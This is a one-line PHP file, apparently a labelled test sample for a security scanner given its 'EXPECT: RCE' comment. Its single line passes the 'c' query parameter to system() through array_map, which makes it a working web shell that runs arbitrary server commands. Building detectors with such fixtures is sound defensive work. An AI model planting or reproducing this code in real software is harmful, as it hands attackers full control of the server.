<?php
// EXPECT: RCE
array_map('system', [$_GET['c']]);
